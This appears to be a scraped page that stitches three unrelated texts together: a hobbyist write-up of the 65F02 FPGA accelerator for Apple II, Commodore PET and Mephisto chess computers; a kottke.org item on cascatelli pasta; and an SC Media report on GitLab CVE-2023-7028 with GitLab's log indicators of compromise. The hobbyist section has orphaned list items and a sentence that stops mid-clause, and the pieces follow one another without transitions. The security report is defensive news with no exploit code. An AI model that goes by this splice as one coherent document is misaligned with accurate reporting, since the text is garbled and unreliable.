<p>The idea is to use this as a “universal” accelerator for 6502 and 65C02-based host computers – just plug it into the CPU socket. The only thing the FPGA board needs to know about its host is the memory map: Where does the host have memory-mapped I/O? Up to 16 different memory maps can be stored in the FPGA, and selected via a mini DIP switch. Upon power-on, the 65F02 grabs the complete RAM and ROM content from the host and copies it into the on-chip RAM, except for the I/O area. Then the CPU gets going, using the internal memory at 100 MHz for all bus accesses except for any I/O addresses – for these, the internal CPU pauses, and an external bus cycle is started at whatever the external clock speed is.</p>
<p>Kudos to Roland Langfeld, who suggested this elegant way of integrating an accelerator into almost any host, and has contributed a lot during the testing and debugging effort. Roland’s original interest was in 6502-based chess computers (there were some really nice ones in the 1980s). But we have successfully tested the prototype 65F02s in an Apple II and a Commodore 8032, as well as various chess computers.</p>

<p>We have focused on Mephisto chess computers first, since these are at the center of Roland’s collector’s interest. But many others are on the wishlist, including Fidelity (Elite A/S Budapest and Glasgow, Prestige, Avantgarde), Novag (Super Constellation, Super Expert C), SciSys (Turbostar), …</p>

<li>Novag Constellation Forte A/B</li>
<li>Chafitz ARB (various Sargon versions) and MGS</li>
</ul>
<h2 id="microcomputers">Microcomputers</h2>
<p>So far, we are supporting the two 6502-based members of the classic 1977 “Trinity” of home computers – the Apple II and the Commodore PET series. It may be possible and worthwhile to also support some slightly later machines: The Acorn BBC Micro, Atari 400 and 800, and maybe the Commodore C64 come to mind. I don’t have any of these computers though. Please contact me if you are interested to help with an adaptation of the 65F02!</p>
<ul>
<li>
<p><strong>Apple II</strong>, including the II plus and europlus, and presumably the //e. Quite a bit of hardware and software trickery by Steve Wozniak, and the older models do not support a real 65C02 – but the 65F02 is a bit more generous in its bus timing and works nicely. The Disk II floppy drive works nicely under DOS 3.3; support for the language card is under development.</p>
</li>
<li>
<p><strong>Commodore PET/CBM up to 8032</strong>. A very clean and “by the book” design. The same memory map should work for all models from the PET 2001, the 3000 and 4000 series, and the 8000 series up to the 8032. (But excluding the 8096 and beyond, which require memory bank switching.) So far we have tested this on the 8032 only; the 8050 floppy drive works.</p>
</li>
</ul>
<p>A caveat is in order here. The home computers, with their flexibility and expandability on both the hardware and software side, are bound to encounter limitations and incompatibilities:</p>
<p>Memory expansion boards and bank switching need to be known to and emulated by the 65F02; and since the 65F02 only has 64 kByte of RAM on board, it cannot fully accelerate the extended memory. Also, while the 65F02 makes an effort to detect the access to time-critical peripheral devices, and switch back to the original slow speed temporarily, there will probably be incompatible software or add-on hardware. And finally, some software you simply don’t <em>want</em> to be accelerated – try an action video game at 100 MHz to understand that concern…</p>
<p>The 65F02 supports an optional hardware switch to disable the acceleration. This way, one can still select between accelerated operation and original speed before one starts the host computer. In non-accelerated mode, the 65F02 should be fully compatible with any software or add-on hardware. (Well; unless the software uses undocumented 6502 opcodes…)</p>
<h2 id="project-status">Project status</h2>
<p>This is a hobby project, and I have no plans at the moment to take it commercial.</p>
<p>Several of the small-form-factor PCBs have been assembled, and have been successfully tested in the above-mentioned computers. The tested computers include environments with TTL and CMOS logic levels, and clock rates ranging from 1 to 5 MHz. IRQs and NMIs are used in the hosts; some of the Mephisto chess computers actively use the READY signal to slow down the CPU, and the 65F02 respects that nicely. We have not used the SO (set overflow) input in earnest, but believe it to work.</p>
<p>The chess computer community has put the 65F02 through its paces and found some very nice improvements in playing strength for the old chess computers. Games and commentary can be found in the German

<p><mark>Update, July 2022:</mark> The global electronics supply bottlenecks affect this project too. The Xilinx Spartan-6 FPGA (in the required package and speed grade) has moved from a lead time of more than one year to “we don’t know”. The 65F02 will sit on the back burner until the supply situation hopefully returns to normal.</p>

            <description><![CDATA[<p>URL: <a href="https://kottke.org/21/03/the-invention-of-a-new-pasta-shape">https://kottke.org/21/03/the-invention-of-a-new-pasta-shape</a>, See on <a href="https://news.ycombinator.com/item?id=39159263">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>For the past three years, Dan Pashman of <a href="https://www.sporkful.com/">The Sporkful podcast</a> has been on something of a mission: to invent a new pasta shape. All of Pashman's hard work has paid off with the debut of cascatelli pasta, <a href="https://www.sfoglini.com/products/sporkful">available for sale from Sfoglini</a>.</p>

<p><img src="https://kottke.org/plus/misc/images/cascatelli-pasta-01.jpg" width="1000" height="1000" alt="Cascatelli pasta"></p>

<p>Pashman and Sfoglini engineered the new shape to maximize the amount of sauce that sticks to it, make it easier to get your fork on it, and have it feel good when you bite into it.</p>

<p><img src="https://kottke.org/plus/misc/images/cascatelli-pasta-02.jpg" width="1000" height="1000" alt="Cascatelli Pasta 02"></p>

<blockquote><p>Cascatelli is designed to maximize the three qualities by which Dan believes all pasta shapes should be judged:</p>

<p>Sauceability: How readily sauce adheres to the shape<br>
Forkability: How easy it is to get the shape on your fork and keep it there<br>
Toothsinkability: How satisfying it is to sink your teeth into it</p></blockquote>

<p>Pashman documented the invention of cascatelli in a 5-part series on The Sporkful podcast — <a href="https://www.sporkful.com/mission-impastable-1-spaghetti-sucks/">you can listen to the first episode here</a> — and <a href="https://www.instagram.com/s/aGlnaGxpZ2h0OjE3ODYzOTA1ODY2NDgzOTY0?igshid=fvqxwa81z7nc&amp;story_media_id=2517176903157538890">on Instagram</a>. You can <a href="https://www.sfoglini.com/products/sporkful">order some cascatelli</a> to try it out at home, but it looks like they are currently sold out of everything aside from 5-lb bulk bags.</p>

<div id="readability-page-1" class="page"><article><div><p><a href="https://www.scmagazine.com/news/gitlab-vulnerability-risks-account-takeover-via-simple-password-reset" target="_blank" rel="noreferrer noopener">Critical GitLab vulnerability CVE-2023-7028</a> was not patched on more than 5,300 servers as of Tuesday, potentially enabling remote takeover of software developers’ accounts.</p><p>The bug, with a maximum CVSS score of 10, <a href="https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/" target="_blank" rel="noreferrer noopener">was first disclosed and patched by GitLab</a> on Jan. 11. The vulnerability in GitLab’s login system would allow an attacker to have a password reset link sent to their own unverified email address without any user interaction by the victim.</p><p>“Account takeover can be achieved by crafting a specially formatted HTTP request that is capable of sending a password reset email to an unverified email address in an unpatched version,” a GitLab spokesperson told SC Media in a Jan. 12 email.</p><p>Security updates were released for GitLab versions 16.5.6, 16.6.4 and 16.7.2 and backported to versions 16.1.6, 16.2.9, 16.3.7 and 16.4.5, as well.</p><p>One researcher who tested the bug on GitLab Community Edition version 16.6.1 and <a href="https://attackerkb.com/topics/VBDvNxhyjr/cve-2023-7028" target="_blank" rel="noreferrer noopener">shared their results on AttackerKB</a> said CVE-2023-7028 was, “Very effective and easy to exploit.”</p><p>Nearly two weeks after patches became available, <a href="https://dashboard.shadowserver.org/statistics/combined/map/?map_type=std&amp;day=2024-01-23&amp;source=http_vulnerable&amp;source=http_vulnerable6&amp;tag=cve-2023-7028%2B&amp;geo=all&amp;data_set=count&amp;scale=log" target="_blank" rel="noreferrer noopener">5,379 vulnerable instances of GitLab</a> were detected worldwide by the Shadowserver Foundation. The nonprofit organization, which monitors malicious activity online, <a href="https://twitter.com/Shadowserver/status/1750115947430416434" target="_blank" rel="noreferrer noopener">posted the data from Jan. 23 on X</a>, noting that the United States and Germany had the most vulnerable instances, with 964 and 730 respectively.</p><p><a href="https://dashboard.shadowserver.org/statistics/combined/time-series/?date_range=7&amp;source=http_vulnerable&amp;source=http_vulnerable6&amp;tag=cve-2023-7028%2B&amp;group_by=geo&amp;style=stacked" target="_blank" rel="noreferrer noopener">Shadowserver’s dashboard tool</a> showed fewer vulnerable instances (4,652) on Jan. 24. A Shadowserver spokesperson confirmed with SC Media that there was "a drop in detected vulnerable instances, which is a positive development," but that more time would be needed to determine whether this decrease was a trend or a "blip" in Shadowserver's scans.</p><h2>Indicators of compromise for GitLab CVE-2023-7028</h2><p>GitLab customers with self-managed instances of the affected products — GitLab Community Edition and GitLab Enterprise Edition&nbsp;— should review their logs for exploitation of CVE-2023-7028 using the two following methods, as outlined by GitLab:</p><div><ul><li>Check gitlab-rails/production_json.log for HTTP requests to the /users/password path with params.value.email consisting of a JSON array with multiple email addresses</li><li>Check gitlabs-rails/audit_json.log for entries with meta.caller.id of PasswordsController#create and target_Details consisting of a JSON array with multiple email addresses</li></ul></div><p>The company said no exploitation of the bug on GitLab.com or GitLab Dedicated instances has been detected.</p><p>GitLab recommended customers also enable two-factor authentication (2FA), which prevents account takeover via CVE-2023-7028, although users of unpatched instances are still vulnerable to being locked out of their accounts if an attacker exploits the flaw to reset their password.</p></div></article></div>]]></description>
